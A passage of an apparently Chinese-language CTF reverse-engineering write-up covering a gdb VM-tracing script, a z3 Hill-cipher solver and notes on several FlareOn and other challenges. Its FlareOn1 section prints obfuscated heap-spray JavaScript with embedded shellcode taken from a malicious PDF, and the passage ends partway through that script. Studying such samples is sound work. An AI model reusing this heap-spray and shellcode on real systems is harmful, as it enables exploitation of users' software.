[<span class="number">0</span>]*<span class="number">0x300</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    op1 = gdb.execute(<span class="string">&#x27;x/xg $rbp-0x50&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    op1 = int(op1.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>][<span class="number">3</span>:],base=<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># f.write(op1)</span></span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (op1&amp;<span class="number">0x7f</span>)!=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    rip = gdb.execute(<span class="string">&#x27;p/x $rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    rip = int(rip.split(<span class="string">&#x27;= &#x27;</span>)[<span class="number">1</span>][<span class="number">2</span>:],base=<span class="number">16</span>)</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    op2 = gdb.execute(<span class="string">&#x27;p/x $rax&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    op2 = int(op2.split(<span class="string">&#x27;= &#x27;</span>)[<span class="number">1</span>][<span class="number">2</span>:],base=<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    opc2 = <span class="number">0</span></span><br><span class="line">    op2a = []</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    lastip=ip</span><br><span class="line">    <span class="keyword">while</span> op2!=<span class="number">0</span> <span class="keyword">or</span> i&lt;<span class="number">10</span>:</span><br><span class="line">        op2a.append(op2&amp;<span class="number">0xff</span>)</span><br><span class="line">        op2&gt;&gt;=<span class="number">8</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    typ = (op1&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> typ==<span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">            opc2 = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            ip+=<span class="number">7</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            opc2=op2a[<span class="number">3</span>]</span><br><span class="line">            ip+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">            s=<span class="string">&#x27;mov reg[0x%x],0x%x&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">1</span>]==<span class="number">2</span>:</span><br><span class="line">            s=<span class="string">&#x27;mov reg[0x%x],str[reg[0x%x]]&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">1</span>]==<span class="number">32</span>:</span><br><span class="line">            s=<span class="string">&#x27;mov str[reg[0x%x]],reg[0x%x]&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">1</span>]==<span class="number">0</span>:</span><br><span class="line">            s=<span class="string">&#x27;mov reg[0x%x],reg[0x%x]&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=<span class="string">&#x27;mov:unknown:%x&#x27;</span>%op2[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> typ==<span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">            opc2 = str(toDword(op2a[<span class="number">3</span>:]))</span><br><span class="line">            ip+=<span class="number">7</span></span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">1</span>]==<span class="number">0</span>:</span><br><span class="line">            opc2=<span class="string">&quot;reg[&quot;</span>+str(op2a[<span class="number">3</span>])+<span class="string">&quot;]&quot;</span></span><br><span class="line">            ip+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">0</span>]==<span class="number">0</span>:</span><br><span class="line">            s=<span class="string">&#x27;add reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">1</span>:</span><br><span class="line">            s=<span class="string">&#x27;sub reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">2</span>:</span><br><span class="line">            s=<span class="string">&#x27;mul reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">3</span>:</span><br><span class="line">            s=<span class="string">&#x27;div reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">4</span>:</span><br><span class="line">            s=<span class="string">&#x27;mod reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">5</span>:</span><br><span class="line">            s=<span class="string">&#x27;or reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">6</span>:</span><br><span class="line">            s=<span class="string">&#x27;and reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">7</span>:</span><br><span class="line">            s=<span class="string">&#x27;xor reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">8</span>:</span><br><span class="line">            s=<span class="string">&#x27;shl reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">0</span>]==<span class="number">9</span>:</span><br><span class="line">            s=<span class="string">&#x27;shr reg[0x%x],%s&#x27;</span>%(op2a[<span class="number">2</span>],opc2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=<span class="string">&#x27;unknown:arthimetic:%x&#x27;</span>%op2a[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> typ==<span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">2</span>]==<span class="number">1</span>:</span><br><span class="line">            opc2=toDword(op2a[<span class="number">4</span>:])</span><br><span class="line">            s=<span class="string">&#x27;cmp reg[%d],0x%x&#x27;</span>%(op2a[<span class="number">3</span>],opc2)</span><br><span class="line">            ip+=<span class="number">8</span></span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">0</span>:</span><br><span class="line">            opc2=op2a[<span class="number">4</span>]</span><br><span class="line">            s=<span class="string">&#x27;cmp reg[%d],reg[%d]&#x27;</span>%(op2a[<span class="number">3</span>],opc2)</span><br><span class="line">            ip+=<span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> typ==<span class="number">11</span>:</span><br><span class="line">        <span class="keyword">if</span> op2a[<span class="number">2</span>]==<span class="number">0</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jmp %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">1</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jz %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">2</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jnz %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">3</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jg %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">4</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jge %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">5</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jl %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">elif</span> op2a[<span class="number">2</span>]==<span class="number">6</span>:</span><br><span class="line">            dif = toDword(op2a[<span class="number">3</span>:])</span><br><span class="line">            <span class="keyword">if</span> dif&gt;<span class="number">0x80000000</span>:</span><br><span class="line">                dif = dif<span class="number">-0xffffffff</span></span><br><span class="line">            s=<span class="string">&#x27;jle %03x&#x27;</span>%(rip+dif)</span><br><span class="line">        <span class="keyword">else</span>:s=<span class="string">&#x27;unknown:jmp:%x&#x27;</span>%op2a[<span class="number">2</span>]</span><br><span class="line">        ip+=<span class="number">7</span></span><br><span class="line">    <span class="keyword">else</span>:s=<span class="string">&#x27;unknown type:%x&#x27;</span>%typ</span><br><span class="line">    <span class="keyword">if</span> rip <span class="keyword">not</span> <span class="keyword">in</span> exedip:</span><br><span class="line">        <span class="comment"># f.write(&#x27;%03x:%04x:%s\n&#x27;%(rip,op1,s))</span></span><br><span class="line">        res[rip<span class="number">-0x401400</span>]=<span class="string">&#x27;%03x:%04x:%s\n&#x27;</span>%(rip,op1,s)</span><br><span class="line">        exedip.add(rip)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">        f.write(i)</span><br><span class="line">f.close()</span><br><span class="line">gdb.execute(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb -q -p $(pidof signal_vm) -x 2.py</span><br><span class="line">gdb -q -x 2.py</span><br></pre></td></tr></table></figure>

<p>打印出了执行路径，先判断长度是0x46</p>
<p>两个矩阵相乘然后比对数据，希尔加密</p>
<p>本来可以希尔解密的，可是模逆矩阵不好弄，直接z3一把梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">xorData = [<span class="number">65</span>,<span class="number">108</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">118</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">103</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">97</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">100</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>]</span><br><span class="line">target = [<span class="number">214</span>,<span class="number">77</span>,<span class="number">45</span>,<span class="number">133</span>,<span class="number">119</span>,<span class="number">151</span>,<span class="number">96</span>,<span class="number">98</span>,<span class="number">43</span>,<span class="number">136</span>,<span class="number">134</span>,<span class="number">202</span>,<span class="number">114</span>,<span class="number">151</span>,<span class="number">235</span>,<span class="number">137</span>,<span class="number">152</span>,<span class="number">243</span>,<span class="number">120</span>,<span class="number">38</span>,<span class="number">131</span>,<span class="number">41</span>,<span class="number">94</span>,<span class="number">39</span>,<span class="number">67</span>,<span class="number">251</span>,<span class="number">184</span>,<span class="number">23</span>,<span class="number">124</span>,<span class="number">206</span>,<span class="number">58</span>,<span class="number">115</span>,<span class="number">207</span>,<span class="number">251</span>,<span class="number">199</span>,<span class="number">156</span>,<span class="number">96</span>,<span class="number">175</span>,<span class="number">156</span>,<span class="number">200</span>,<span class="number">117</span>,<span class="number">205</span>,<span class="number">55</span>,<span class="number">123</span>,<span class="number">59</span>,<span class="number">155</span>,<span class="number">78</span>,<span class="number">195</span>,<span class="number">218</span>,<span class="number">216</span>,<span class="number">206</span>,<span class="number">113</span>,<span class="number">43</span>,<span class="number">48</span>,<span class="number">104</span>,<span class="number">70</span>,<span class="number">11</span>,<span class="number">255</span>,<span class="number">60</span>,<span class="number">241</span>,<span class="number">241</span>,<span class="number">69</span>,<span class="number">196</span>,<span class="number">208</span>,<span class="number">196</span>,<span class="number">255</span>,<span class="number">81</span>,<span class="number">241</span>,<span class="number">136</span>,<span class="number">81</span>]</span><br><span class="line">key = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(xorData),<span class="number">7</span>):</span><br><span class="line">    key.append(xorData[i:i+<span class="number">7</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(target),<span class="number">7</span>):</span><br><span class="line">    c.append(target[i:i+<span class="number">7</span>])</span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x46</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        ss = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            ss+=v[i*<span class="number">7</span>+k]*key[k][j]</span><br><span class="line">        s.add(ss==c[i][j])</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        flag+=chr(m[i].as_long())</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="rev-FlareOn2-YUSoMeta"><a href="#rev-FlareOn2-YUSoMeta" class="headerlink" title="[rev][FlareOn2]YUSoMeta"></a>[rev][FlareOn2]YUSoMeta</h2><p>如果使用de4dot去混淆的话会导致调试时候得到错误的东西，大概因为这个程序通过c#的反射机制调用方法的。但是去混淆更方便找到主函数，找到主函数之后在混淆中调试就可以得到flag</p>
<h2 id="rev-FlareOn2-Snake"><a href="#rev-FlareOn2-Snake" class="headerlink" title="[rev][FlareOn2]Snake"></a>[rev][FlareOn2]Snake</h2><p>反汇编器<br><a target="_blank" rel="noopener" href="https://github.com/nesdoug/NES-DISASSEMBLER">https://github.com/nesdoug/NES-DISASSEMBLER</a></p>
<p><a target="_blank" rel="noopener" href="https://onlinedisassembler.com/odaweb/">https://onlinedisassembler.com/odaweb/</a></p>
<p>IDA插件 <a target="_blank" rel="noopener" href="https://github.com/Jinmo/nesldr-py">https://github.com/Jinmo/nesldr-py</a></p>
<p>模拟器 <a target="_blank" rel="noopener" href="http://fceux.com/web/home.html">http://fceux.com/web/home.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/harmonica11/p/13456725.html">https://www.cnblogs.com/harmonica11/p/13456725.html</a></p>
<ol>
<li>根据RAM Search的值变化情况找到苹果相关值0025</li>
<li>在0025处下内存断点，找到引用0025的地方</li>
<li>发现需要吃0x33个苹果，然后0026会被赋值f0</li>
<li>直接在cheat窗口将0025改为0x33,0026改为f0</li>
</ol>
<h2 id="rev-INSHack2017-secure-garden-shed-v2"><a href="#rev-INSHack2017-secure-garden-shed-v2" class="headerlink" title="[rev][INSHack2017]secure-garden-shed-v2"></a>[rev][INSHack2017]secure-garden-shed-v2</h2><p>找协议缺陷，可以发现7是弃用的。打开ida看看，7处有个函数，各种异或还输出。所以直接构造code或者gdb set $eip=指定地址 来调用这个函数。</p>
<h2 id="rev-NPUCTF2020-EzReverse"><a href="#rev-NPUCTF2020-EzReverse" class="headerlink" title="[rev][NPUCTF2020]EzReverse"></a>[rev][NPUCTF2020]EzReverse</h2><p>迷宫问题，7个元素为一行</p>
<p>起点为(0,0)，终点为(6,6)，对应的值为偶数则为墙</p>
<p>hjkl 左下又上</p>
<h2 id="rev-FlareOn1-Sploitastic"><a href="#rev-FlareOn1-Sploitastic" class="headerlink" title="[rev][FlareOn1]Sploitastic"></a>[rev][FlareOn1]Sploitastic</h2><p>一个pdf，使用binwalk解出三个zlib文件，里面是纯文本</p>
<p>看起来像16进制数字，直接解码，解出一个js脚本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> HdPN = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> IxTUQnOvHg = <span class="built_in">unescape</span>(<span class="string">&quot;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> MPBPtdcBjTlpvyTYkSwgkrWhXL = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=<span class="number">128</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=<span class="number">0</span>;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += <span class="built_in">unescape</span>(<span class="string">&quot;%ub32f%u3791&quot;</span>);</span><br><span class="line">ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;</span><br><span class="line">OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = <span class="built_in">unescape</span>(<span class="string">&quot;%ub32f%u3791&quot;</span>);</span><br><span class="line">fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = <span class="number">20</span>;</span><br><span class="line">fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length</span><br><span class="line"><span class="keyword">while</span> (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&lt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;</span><br><span class="line">UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(<span class="number">0</span>, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);</span><br><span class="line">MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(<span class="number">0</span>, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);</span><br><span class="line"><span class="keyword">while</span>(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA &lt; <span class="number">0x40000</span>) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;</span><br><span class="line">DPwxazRhwbQGu = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=<span class="number">0</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&lt;<span class="number">100</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=<span class="number">142</span>;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&gt;=<span class="number">0</span>;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += <span class="built_in">unescape</span>(<span class="string">&quot;%ub550%u0166&quot;</span>);</span><br><span class="line">bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + <span class="number">20</span></span><br><span class="line"><span class="keyword">while</span> (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length &lt; bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;</span><br><span class="line">Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(<span 